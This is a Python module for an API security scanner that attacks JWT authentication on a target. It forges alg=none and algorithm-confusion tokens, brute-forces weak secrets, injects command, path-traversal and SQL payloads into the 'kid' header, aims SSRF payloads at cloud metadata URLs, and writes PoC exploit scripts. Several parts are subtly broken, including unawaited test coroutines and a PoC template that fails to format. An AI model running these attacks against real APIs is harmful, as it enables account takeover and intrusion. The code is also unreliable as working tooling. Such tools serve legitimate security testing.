"""JWT Advanced Testing Engine for OverApi."""

import base64
import json
import hashlib
import hmac
import logging
import asyncio
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional, List, Dict, Any
from datetime import datetime, timedelta
import requests
from urllib.parse import urlparse


class JWTVulnerabilityType(Enum):
    """JWT vulnerability type enumeration."""
    ALGORITHM_NONE = "algorithm_none_attack"
    ALGORITHM_CONFUSION = "algorithm_confusion"
    WEAK_SECRET = "weak_secret"
    KID_INJECTION = "kid_injection"
    JKU_INJECTION = "jku_injection"
    CLAIMS_MANIPULATION = "claims_manipulation"
    TOKEN_SUBSTITUTION = "token_substitution"
    EXPIRED_TOKEN = "expired_token_acceptance"
    NO_EXPIRATION = "missing_exp_claim"
    WEAK_ALGORITHM = "weak_algorithm"
    JWT_DETECTED = "jwt_detected"


@dataclass
class JWTVulnerability:
    """JWT vulnerability finding."""
    vuln_type: JWTVulnerabilityType
    severity: str  # critical, high, medium, low
    title: str
    description: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    remediation: str = ""
    cvss_score: float = 0.0
    cwe_id: str = ""
    owasp_category: str = ""
    poc_script: str = ""
    references: List[str] = field(default_factory=list)
    endpoint: str = ""
    parameter_location: str = ""  # header, body, cookie, query

    def to_dict(self) -> Dict[str, Any]:
        """Convert vulnerability to dictionary."""
        return {
            'type': self.vuln_type.value,
            'severity': self.severity,
            'title': self.title,
            'description': self.description,
            'evidence': self.evidence,
            'remediation': self.remediation,
            'cvss_score': self.cvss_score,
            'cwe_id': self.cwe_id,
            'owasp_category': self.owasp_category,
            'poc_script': self.poc_script,
            'references': self.references,
            'endpoint': self.endpoint,
            'parameter_location': self.parameter_location,
        }


class JWTAnalyzer:
    """Advanced JWT vulnerability analysis engine."""

    # Common weak secrets
    WEAK_SECRETS = [
        'secret', 'secret123', 'password', 'password123', '123456', 'admin', 'admin123',
        'test', 'test123', 'jwt', 'jwt_secret', 'jwt-secret', 'key', 'key123',
        'mysecret', 'mykey', 'token', 'token123', 'auth', 'auth123', 'default',
        'changeme', 'supersecret', 'verysecret', 'secretkey', '12345678',
        'qwerty', 'letmein', 'abc123', 'password1', 'pass', 'pass123',
    ]

    # Public key extraction patterns
    JWK_PATTERNS = [
        r'\.well-known/jwks\.json',
        r'jwks\.json',
        r'\.well-known/openid-configuration',
        r'oauth/discovery/keys',
    ]

    def __init__(self, target_url: str, headers: Dict[str, str] = None,
                 proxies: Dict[str, str] = None, timeout: int = 30):
        """
        Initialize JWT Analyzer.

        Args:
            target_url: Target API URL
            headers: Custom HTTP headers
            proxies: Proxy configuration
            timeout: Request timeout in seconds
        """
        self.target_url = target_url
        self.headers = headers or {}
        self.proxies = proxies
        self.timeout = timeout
        self.logger = logging.getLogger(__name__)
        self.vulnerabilities: List[JWTVulnerability] = []
        self.session = requests.Session()
        if proxies:
            self.session.proxies.update(proxies)

    async def analyze(self, test_endpoints: List[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute comprehensive JWT analysis.

        Args:
            test_endpoints: List of endpoints to test [{path, method, description}]

        Returns:
            Analysis results with vulnerabilities and recommendations
        """
        self.logger.info("Starting JWT analysis...")

        results = {
            'vulnerabilities': [],
            'token_info': {},
            'recommendations': [],
            'endpoints_tested': len(test_endpoints) if test_endpoints else 0,
        }

        if not test_endpoints:
            test_endpoints = self._get_default_test_endpoints()

        # Extract tokens from endpoints
        tokens_found = {}
        for endpoint in test_endpoints:
            token = await self._extract_token_from_endpoint(endpoint)
            if token:
                tokens_found[endpoint['path']] = token

        results['token_info']['tokens_found'] = list(tokens_found.keys())

        # Analyze each token found
        for endpoint_path, token in tokens_found.items():
            self.logger.info(f"Analyzing JWT from {endpoint_path}...")

            # Decode token
            try:
                decoded = self.decode_jwt(token)

                # Run all tests
                tests = [
                    self.test_algorithm_none_attack(token, endpoint_path),
                    self.test_algorithm_confusion(token, endpoint_path),
                    self.test_weak_secret_bruteforce(token, endpoint_path),
                    self.test_kid_header_injection(token, endpoint_path),
                    self.test_jku_x5u_injection(token, endpoint_path),
                    self.test_claims_manipulation(token, endpoint_path),
                    self.test_token_substitution(token, endpoint_path),
                    self.test_expired_token_acceptance(token, endpoint_path),
                    self.test_missing_expiration(token, endpoint_path),
                    self.test_weak_algorithm(token, endpoint_path),
                ]

                # Execute tests
                for test_result in tests:
                    if test_result:
                        self.vulnerabilities.append(test_result)
                        results['vulnerabilities'].append(test_result.to_dict())

            except Exception as e:
                self.logger.error(f"Error analyzing token from {endpoint_path}: {str(e)}")

        # Generate recommendations
        results['recommendations'] = self._generate_recommendations()

        self.logger.info(f"Analysis complete. Found {len(self.vulnerabilities)} vulnerabilities.")
        return results

    def decode_jwt(self, token: str) -> Dict[str, Any]:
        """
        Decode JWT without verifying signature.

        Args:
            token: JWT token string

        Returns:
            Decoded JWT parts {header, payload, signature}
        """
        try:
            parts = token.split('.')
            if len(parts) != 3:
                raise ValueError("Invalid JWT format")

            # Decode header
            header_b64 = parts[0]
            # Add padding if necessary
            padding = 4 - len(header_b64) % 4
            if padding != 4:
                header_b64 += '=' * padding
            header = json.loads(base64.urlsafe_b64decode(header_b64))

            # Decode payload
            payload_b64 = parts[1]
            padding = 4 - len(payload_b64) % 4
            if padding != 4:
                payload_b64 += '=' * padding
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            return {
                'header': header,
                'payload': payload,
                'signature': parts[2],
                'raw': token,
            }
        except Exception as e:
            self.logger.error(f"Failed to decode JWT: {str(e)}")
            return {}

    def generate_jwt(self, header: Dict[str, Any], payload: Dict[str, Any],
                    secret: str = None, algorithm: str = "HS256") -> str:
        """
        Generate JWT token with custom header and payload.

        Args:
            header: JWT header
            payload: JWT payload
            secret: Secret key for signing
            algorithm: Algorithm to use

        Returns:
            JWT token string
        """
        try:
            # Encode header and payload
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')

            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')

            message = f"{header_b64}.{payload_b64}"

            # Sign token
            if algorithm == "HS256" and secret:
                signature = hmac.new(
                    secret.encode(),
                    message.encode(),
                    hashlib.sha256
                ).digest()
            elif algorithm == "none":
                signature = b""
            else:
                # For other algorithms, would need RSA/ECDSA libraries
                signature = b""

            signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

            return f"{message}.{signature_b64}"
        except Exception as e:
            self.logger.error(f"Failed to generate JWT: {str(e)}")
            return ""

    async def test_algorithm_none_attack(self, token: str, endpoint: str = "") -> Optional[JWTVulnerability]:
        """
        Test for algorithm 'none' vulnerability (CVE-2015-9235).

        Server accepts JWT with alg=none, allowing signature bypass.
        """
        try:
            decoded = self.decode_jwt(token)
            if not decoded:
                return None

            original_header = decoded['header']
            original_payload = decoded['payload']

            # Create token with alg=none
            none_header = {**original_header, 'alg': 'none'}
            malicious_token = self.generate_jwt(none_header, original_payload, algorithm="none")

            if not malicious_token:
                return None

            # Test if server accepts the malicious token
            response = await self._test_token_acceptance(malicious_token, endpoint)

            if response and response.status_code == 200:
                return JWTVulnerability(
                    vuln_type=JWTVulnerabilityType.ALGORITHM_NONE,
                    severity="critical",
                    title="JWT Algorithm None Attack",
                    description="API accepts JWT tokens with 'none' algorithm, allowing signature bypass",
                    evidence={
                        'original_token': token[:50] + '...',
                        'malicious_token': malicious_token[:50] + '...',
                        'response_status': response.status_code,
                        'algorithm': 'none',
                    },
                    remediation="Explicitly reject tokens with 'none' algorithm. Use strong algorithms like RS256 or ES256.",
                    cvss_score=9.1,
                    cwe_id="CWE-347",
                    owasp_category="API2:2023 Broken Authentication",
                    endpoint=endpoint,
                    parameter_location="header",
                    references=[
                        "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                        "CVE-2015-9235"
                    ]
                )
        except Exception as e:
            self.logger.debug(f"Algorithm none test error: {str(e)}")

        return None

    async def test_algorithm_confusion(self, token: str, endpoint: str = "") -> Optional[JWTVulnerability]:
        """
        Test for algorithm confusion attack (RS256 -> HS256).

        Server uses public key for RS256 verification but accepts HS256 with the public key as secret.
        """
        try:
            decoded = self.decode_jwt(token)
            if not decoded or decoded['header'].get('alg') != 'RS256':
                return None

            # Try to extract public key
            public_key = await self._extract_public_key(endpoint)

            if not public_key:
                return None

            # Re-sign token using HS256 with public key as secret
            header = {**decoded['header'], 'alg': 'HS256'}
            payload = decoded['payload']

            confused_token = self.generate_jwt(header, payload, secret=public_key, algorithm="HS256")

            if not confused_token:
                return None

            # Test if server accepts
            response = await self._test_token_acceptance(confused_token, endpoint)

            if response and response.status_code == 200:
                return JWTVulnerability(
                    vuln_type=JWTVulnerabilityType.ALGORITHM_CONFUSION,
                    severity="critical",
                    title="JWT Algorithm Confusion Attack",
                    description="API vulnerable to algorithm confusion. RS256 public key used as HS256 secret.",
                    evidence={
                        'original_algorithm': 'RS256',
                        'confused_algorithm': 'HS256',
                        'response_status': response.status_code,
                    },
                    remediation="Explicitly specify algorithm during token verification. Never accept dynamic algorithm selection.",
                    cvss_score=9.1,
                    cwe_id="CWE-347",
                    owasp_category="API2:2023 Broken Authentication",
                    endpoint=endpoint,
                    references=["https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"]
                )
        except Exception as e:
            self.logger.debug(f"Algorithm confusion test error: {str(e)}")

        return None

    async def test_weak_secret_bruteforce(self, token: str, endpoint: str = "") -> Optional[JWTVulnerability]:
        """
        Test for weak JWT secret via bruteforce.

        Attempts to crack secret using common weak secrets list.
        """
        try:
            decoded = self.decode_jwt(token)
            if not decoded:
                return None

            algorithm = decoded['header'].get('alg', 'HS256')

            # Only test for symmetric algorithms
            if algorithm not in ['HS256', 'HS384', 'HS512']:
                return None

            original_token = token

            # Try each weak secret
            for secret in self.WEAK_SECRETS:
                try:
                    # Create token with weak secret
                    test_token = self.generate_jwt(
                        decoded['header'],
                        decoded['payload'],
                        secret=secret,
                        algorithm=algorithm
                    )

                    if test_token == original_token:
                        # Found matching secret
                        return JWTVulnerability(
                            vuln_type=JWTVulnerabilityType.WEAK_SECRET,
                            severity="critical",
                            title="JWT Weak Secret Detected",
                            description=f"JWT signed with weak secret: '{secret}'",
                            evidence={
                                'algorithm': algorithm,
                                'weak_secret': secret,
                                'attack_type': 'bruteforce',
                            },
                            remediation="Use strong, randomly generated secrets. Minimum 32 characters of entropy.",
                            cvss_score=9.0,
                            cwe_id="CWE-521",
                            owasp_category="API2:2023 Broken Authentication",
                            endpoint=endpoint,
                            poc_script=f"jwt.decode(token, '{secret}', algorithms=['{algorithm}'])",
                        )
                except Exception:
                    continue

        except Exception as e:
            self.logger.debug(f"Weak secret test error: {str(e)}")

        return None

    async def test_kid_header_injection(self, token: str, endpoint: str = "") -> Optional[JWTVulnerability]:
        """
        Test for key ID (kid) header injection attacks.

        Tests SQL injection, path traversal, command injection in kid parameter.
        """
        try:
            decoded = self.decode_jwt(token)
            if not decoded or 'kid' not in decoded['header']:
                return None

            injection_payloads = [
                ("' OR '1'='1", "SQL Injection"),
                ("../../etc/passwd", "Path Traversal"),
                ("; cat /etc/passwd", "Command Injection"),
                ("${7*7}", "Expression Language"),
                ("{{7*7}}", "Template Injection"),
            ]

            for payload, vuln_type in injection_payloads:
                malicious_header = {**decoded['header'], 'kid': payload}
                malicious_token = self.generate_jwt(
                    malicious_header,
                    decoded['payload'],
                    algorithm=decoded['header'].get('alg', 'HS256')
                )

                # Test the malicious token
                response = await self._test_token_acceptance(malicious_token, endpoint)

                if response and response.status_code == 200:
                    return JWTVulnerability(
                        vuln_type=JWTVulnerabilityType.KID_INJECTION,
                        severity="high",
                        title=f"JWT KID Header {vuln_type}",
                        description=f"JWT 'kid' header parameter vulnerable to {vuln_type}",
                        evidence={
                            'payload': payload,
                            'vulnerability_type': vuln_type,
                            'response_status': response.status_code,
                        },
                        remediation="Validate and sanitize 'kid' parameter. Use whitelist of allowed key IDs.",
                        cvss_score=7.5,
                        cwe_id="CWE-89" if "SQL" in vuln_type else "CWE-22" if "Path" in vuln_type else "CWE-78",
                        endpoint=endpoint,
                    )
        except Exception as e:
            self.logger.debug(f"KID injection test error: {str(e)}")

        return None

    async def test_jku_x5u_injection(self, token: str, endpoint: str = "") -> Optional[JWTVulnerability]:
        """
        Test for JKU and X5U header injection attacks (SSRF).

        Attempts to make server fetch malicious key from attacker-controlled URL.
        """
        try:
            decoded = self.decode_jwt(token)
            if not decoded:
                return None

            has_jku = 'jku' in decoded['header']
            has_x5u = 'x5u' in decoded['header']

            if not (has_jku or has_x5u):
                return None

            # SSRF test payloads
            ssrf_payloads = [
                "http://169.254.169.254/latest/meta-data/",  # AWS metadata
                "http://localhost:6379/",  # Redis
                "http://127.0.0.1:3306/",  # MySQL
            ]

            for payload in ssrf_payloads:
                malicious_header = {**decoded['header']}
                if has_jku:
                    malicious_header['jku'] = payload
                if has_x5u:
                    malicious_header['x5u'] = payload

                malicious_token = self.generate_jwt(
                    malicious_header,
                    decoded['payload'],
                    algorithm=decoded['header'].get('alg', 'HS256')
                )

                response = await self._test_token_acceptance(malicious_token, endpoint)

                if response and response.status_code == 200:
                    return JWTVulnerability(
                        vuln_type=JWTVulnerabilityType.JKU_INJECTION,
                        severity="high",
                        title="JWT JKU/X5U SSRF Injection",
                        description="JWT 'jku' or 'x5u' headers vulnerable to SSRF attacks",
                        evidence={
                            'header_parameter': 'jku' if has_jku else 'x5u',
                            'ssrf_payload': payload,
                            'response_status': response.status_code,
                        },
                        remediation="Validate 'jku' and 'x5u' URLs. Use whitelist of allowed URLs. Disable URL loading if not needed.",
                        cvss_score=8.0,
                        cwe_id="CWE-918",
                        owasp_category="API10:2023 Unsafe Consumption of APIs",
                        endpoint=endpoint,
                    )
        except Exception as e:
            self.logger.debug(f"JKU/X5U injection test error: {str(e)}")

        return None

    async def test_claims_manipulation(self, token: str, endpoint: str = "") -> Optional[JWTVulnerability]:
        """
        Test for claims manipulation without signature validation.

        Attempts to modify token claims (user ID, role, etc.) without invalidating signature.
        """
        try:
            decoded = self.decode_jwt(token)
            if not decoded:
                return None

            original_payload = decoded['payload']

            # Test various claim modifications
            tests = [
                ('sub', '1'),  # User ID
                ('user_id', '1'),
                ('id', '1'),
                ('role', 'admin'),
                ('permissions', ['admin']),
                ('is_admin', True),
                ('scope', 'admin'),
            ]

            for claim_key, claim_value in tests:
                if claim_key in original_payload:
                    # Try to modify the claim
                    modified_payload = {**original_payload, claim_key: claim_value}

                    # Create new token with original signature (won't work, but test if server validates)
                    modified_token = self.generate_jwt(
                        decoded['header'],
                        modified_payload,
                        algorithm=decoded['header'].get('alg', 'HS256')
                    )

                    response = await self._test_token_acceptance(modified_token, endpoint)

                    if response and response.status_code == 200:
                        return JWTVulnerability(
                            vuln_type=JWTVulnerabilityType.CLAIMS_MANIPULATION,
                            severity="critical",
                            title="JWT Claims Manipulation",
                            description=f"JWT claims can be modified without signature validation",
                            evidence={
                                'modified_claim': claim_key,
                                'new_value': claim_value,
                                'response_status': response.status_code,
                            },
                            remediation="Always verify JWT signature before accepting any claims. Use strong secrets.",
                            cvss_score=9.0,
                            cwe_id="CWE-347",
                            owasp_category="API2:2023 Broken Authentication",
                            endpoint=endpoint,
                        )
        except Exception as e:
            self.logger.debug(f"Claims manipulation test error: {str(e)}")

        return None

    async def test_token_substitution(self, token: str, endpoint: str = "") -> Optional[JWTVulnerability]:
        """
        Test for token substitution attacks.

        Attempts to use one user's token for another user's resources.
        """
        # This would require testing with multiple user tokens
        # Placeholder for now
        return None

    async def test_expired_token_acceptance(self, token: str, endpoint: str = "") -> Optional[JWTVulnerability]:
        """
        Test if API accepts expired tokens.

        Creates a token with expiration in the past and tests acceptance.
        """
        try:
            decoded = self.decode_jwt(token)
            if not decoded:
                return None

            # Create expired token
            expired_payload = {**decoded['payload']}
            expired_payload['exp'] = int((datetime.utcnow() - timedelta(days=1)).timestamp())

            expired_token = self.generate_jwt(
                decoded['header'],
                expired_payload,
                algorithm=decoded['header'].get('alg', 'HS256')
            )

            response = await self._test_token_acceptance(expired_token, endpoint)

            if response and response.status_code == 200:
                return JWTVulnerability(
                    vuln_type=JWTVulnerabilityType.EXPIRED_TOKEN,
                    severity="high",
                    title="Expired Token Acceptance",
                    description="API accepts tokens that have expired",
                    evidence={
                        'expiration': 'expired (past date)',
                        'response_status': response.status_code,
                    },
                    remediation="Always validate token expiration (exp claim). Reject expired tokens immediately.",
                    cvss_score=7.5,
                    cwe_id="CWE-613",
                    owasp_category="API2:2023 Broken Authentication",
                    endpoint=endpoint,
                )
        except Exception as e:
            self.logger.debug(f"Expired token test error: {str(e)}")

        return None

    async def test_missing_expiration(self, token: str, endpoint: str = "") -> Optional[JWTVulnerability]:
        """
        Test if token lacks expiration claim.

        Tokens without 'exp' claim never expire.
        """
        try:
            decoded = self.decode_jwt(token)
            if not decoded:
                return None

            if 'exp' not in decoded['payload']:
                return JWTVulnerability(
                    vuln_type=JWTVulnerabilityType.NO_EXPIRATION,
                    severity="medium",
                    title="Missing Token Expiration",
                    description="JWT token lacks 'exp' (expiration) claim, making it valid indefinitely",
                    evidence={
                        'missing_claim': 'exp',
                        'token_validity': 'infinite',
                    },
                    remediation="Always include 'exp' claim with reasonable expiration time (e.g., 1 hour for access tokens)",
                    cvss_score=6.5,
                    cwe_id="CWE-613",
                    owasp_category="API2:2023 Broken Authentication",
                    endpoint=endpoint,
                )
        except Exception as e:
            self.logger.debug(f"Missing expiration test error: {str(e)}")

        return None

    async def test_weak_algorithm(self, token: str, endpoint: str = "") -> Optional[JWTVulnerability]:
        """
        Test if token uses weak algorithms.

        Identifies use of HS256, HS384, HS512 instead of RS256/ES256.
        """
        try:
            decoded = self.decode_jwt(token)
            if not decoded:
                return None

            algorithm = decoded['header'].get('alg', '')
            weak_algorithms = ['HS256', 'HS384', 'HS512']

            if algorithm in weak_algorithms:
                return JWTVulnerability(
                    vuln_type=JWTVulnerabilityType.WEAK_ALGORITHM,
                    severity="medium",
                    title="Weak JWT Algorithm",
                    description=f"Token uses weak symmetric algorithm {algorithm} instead of asymmetric RS256/ES256",
                    evidence={
                        'algorithm': algorithm,
                        'algorithm_type': 'symmetric (weak)',
                    },
                    remediation="Use asymmetric algorithms like RS256 (RSA) or ES256 (ECDSA) for better security",
                    cvss_score=5.3,
                    cwe_id="CWE-327",
                    owasp_category="API2:2023 Broken Authentication",
                    endpoint=endpoint,
                )
        except Exception as e:
            self.logger.debug(f"Weak algorithm test error: {str(e)}")

        return None

    async def _extract_token_from_endpoint(self, endpoint: Dict[str, Any]) -> Optional[str]:
        """
        Extract JWT token from endpoint.

        Looks in Authorization header, cookies, response body.
        """
        try:
            url = f"{self.target_url}{endpoint['path']}"
            method = endpoint.get('method', 'GET').upper()

            headers = {**self.headers}
            headers['User-Agent'] = 'OverApi-JWT-Analyzer/1.0'

            response = self.session.request(
                method=method,
                url=url,
                headers=headers,
                timeout=self.timeout,
            )

            # Look in Authorization header
            auth_header = response.headers.get('Authorization', '')
            if auth_header.startswith('Bearer '):
                token = auth_header.split(' ', 1)[1]
                if self._is_valid_jwt(token):
                    return token

            # Look in Set-Cookie
            for cookie in response.cookies:
                if self._is_valid_jwt(cookie.value):
                    return cookie.value

            # Look in response body
            try:
                data = response.json()
                token = self._find_jwt_in_dict(data)
                if token:
                    return token
            except:
                pass

            # Look in response text
            jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]*'
            match = re.search(jwt_pattern, response.text)
            if match:
                return match.group(0)

        except Exception as e:
            self.logger.debug(f"Token extraction error: {str(e)}")

        return None

    async def _extract_public_key(self, endpoint: str) -> Optional[str]:
        """
        Extract public key from JWKS endpoint or other sources.
        """
        try:
            base_url = self.target_url.rstrip('/')

            # Try common JWKS endpoints
            for pattern in self.JWK_PATTERNS:
                try:
                    jwks_url = f"{base_url}/{pattern.strip('/')}"
                    response = self.session.get(jwks_url, timeout=self.timeout)

                    if response.status_code == 200:
                        data = response.json()
                        if 'keys' in data and len(data['keys']) > 0:
                            # Extract public key from JWKS
                            return self._extract_key_from_jwks(data['keys'][0])
                except Exception:
                    continue
        except Exception as e:
            self.logger.debug(f"Public key extraction error: {str(e)}")

        return None

    def _extract_key_from_jwks(self, jwk: Dict[str, Any]) -> Optional[str]:
        """
        Extract public key from JWK (JSON Web Key) object.
        """
        try:
            # For simple testing, convert JWK to PEM format
            # This is simplified; real implementation would use cryptography library
            if jwk.get('kty') == 'RSA':
                # Return the JWK as string for now
                return json.dumps(jwk)
        except Exception:
            pass

        return None

    def _is_valid_jwt(self, token: str) -> bool:
        """Check if string is valid JWT format."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return False

            # Try to decode header
            header_b64 = parts[0]
            padding = 4 - len(header_b64) % 4
            if padding != 4:
                header_b64 += '=' * padding

            json.loads(base64.urlsafe_b64decode(header_b64))
            return True
        except:
            return False

    def _find_jwt_in_dict(self, data: Dict[str, Any]) -> Optional[str]:
        """Recursively find JWT token in dictionary."""
        if isinstance(data, dict):
            # Check common token field names
            for key in ['token', 'access_token', 'jwt', 'auth_token', 'id_token']:
                if key in data and self._is_valid_jwt(str(data[key])):
                    return str(data[key])

            # Recurse into values
            for value in data.values():
                if isinstance(value, (dict, list)):
                    result = self._find_jwt_in_dict(value)
                    if result:
                        return result

        elif isinstance(data, list):
            for item in data:
                result = self._find_jwt_in_dict(item)
                if result:
                    return result

        return None

    async def _test_token_acceptance(self, token: str, endpoint: str) -> Optional[requests.Response]:
        """
        Test if API accepts the given token.
        """
        try:
            url = f"{self.target_url}{endpoint}".rstrip('/')
            headers = {**self.headers}
            headers['Authorization'] = f'Bearer {token}'
            headers['User-Agent'] = 'OverApi-JWT-Analyzer/1.0'

            response = self.session.get(
                url,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=False,
            )

            return response
        except Exception as e:
            self.logger.debug(f"Token acceptance test error: {str(e)}")

        return None

    def _get_default_test_endpoints(self) -> List[Dict[str, Any]]:
        """Get default endpoints to test for JWT tokens."""
        return [
            {'path': '/api/user/profile', 'method': 'GET', 'description': 'User profile'},
            {'path': '/api/auth/login', 'method': 'POST', 'description': 'Login'},
            {'path': '/api/auth/token', 'method': 'POST', 'description': 'Token endpoint'},
            {'path': '/api/me', 'method': 'GET', 'description': 'Current user'},
            {'path': '/api/users/me', 'method': 'GET', 'description': 'Current user info'},
            {'path': '/api/account', 'method': 'GET', 'description': 'Account info'},
            {'path': '/api/profile', 'method': 'GET', 'description': 'User profile'},
        ]

    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations based on findings."""
        recommendations = []
        severity_counts = {v.severity: 0 for v in self.vulnerabilities}

        for vuln in self.vulnerabilities:
            severity_counts[vuln.severity] = severity_counts.get(vuln.severity, 0) + 1

        if severity_counts.get('critical', 0) > 0:
            recommendations.append("CRITICAL: Fix signature bypass vulnerabilities immediately")

        if any(v.vuln_type == JWTVulnerabilityType.WEAK_SECRET for v in self.vulnerabilities):
            recommendations.append("Use cryptographically strong secrets (minimum 32 characters)")

        if any(v.vuln_type == JWTVulnerabilityType.WEAK_ALGORITHM for v in self.vulnerabilities):
            recommendations.append("Replace symmetric algorithms with RS256 or ES256")

        if any(v.vuln_type == JWTVulnerabilityType.NO_EXPIRATION for v in self.vulnerabilities):
            recommendations.append("Add 'exp' claim to all tokens with reasonable expiration times")

        recommendations.append("Implement token blacklist/revocation mechanism")
        recommendations.append("Use JWT libraries with latest security patches")

        return recommendations

    def generate_poc(self, vulnerability: JWTVulnerability) -> str:
        """
        Generate proof-of-concept script for vulnerability.
        """
        poc_template = """#!/usr/bin/env python3
# PoC for {title}
# Target: {target}

import requests
import json
from base64 import b64encode

TARGET = "{target}"
VULNERABLE_ENDPOINT = "{endpoint}"

# Attack payload
MALICIOUS_TOKEN = "{malicious_token}"

def exploit():
    headers = {
        "Authorization": f"Bearer {{MALICIOUS_TOKEN}}",
        "User-Agent": "OverApi-PoC/1.0"
    }

    try:
        response = requests.get(
            f"{{TARGET}}{{VULNERABLE_ENDPOINT}}",
            headers=headers,
            timeout=10
        )

        print(f"[*] Status: {{response.status_code}}")
        print(f"[*] Response: {{response.text[:500]}}")

        if response.status_code == 200:
            print("[+] VULNERABILITY CONFIRMED!")
        else:
            print("[-] Target appears patched")

    except Exception as e:
        print(f"[!] Error: {{e}}")

if __name__ == "__main__":
    exploit()
"""

        return poc_template.format(
            title=vulnerability.title,
            target=self.target_url,
            endpoint=vulnerability.endpoint,
            malicious_token="<token>",
        )
